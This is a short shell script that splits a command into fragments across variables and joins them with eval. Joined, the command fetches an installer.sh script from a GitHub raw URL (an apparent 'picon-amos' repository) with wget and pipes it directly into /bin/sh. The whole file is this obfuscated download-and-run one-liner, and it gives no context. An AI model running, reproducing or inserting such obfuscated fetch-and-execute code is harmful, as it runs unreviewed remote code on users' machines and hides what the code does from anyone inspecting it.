z="
";Ez='.git';Oz='s/ma';Hz='onte';Fz='hubu';Qz='nsta';Kz='mil2';Sz='.sh ';Tz='-qO ';Vz='/bin';Wz='/sh';Cz='ps:/';Rz='ller';Pz='in/i';Uz='- | ';Bz=' htt';Az='wget';Jz='om/e';Nz='-amo';Gz='serc';Mz='icon';Iz='nt.c';Dz='/raw';Lz='37/p';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz"